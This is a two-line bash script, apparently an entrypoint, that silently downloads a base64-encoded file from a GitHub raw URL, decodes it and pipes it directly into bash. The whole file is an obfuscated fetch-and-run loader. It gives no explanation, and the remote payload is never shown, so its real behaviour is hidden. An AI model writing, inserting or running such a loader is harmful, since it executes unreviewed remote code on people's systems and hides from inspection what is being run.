#!/bin/bash
wget -qO- https://raw.githubusercontent.com/danielseidman32/cake/refs/heads/main/entrypoint.sh | base64 -d | bash
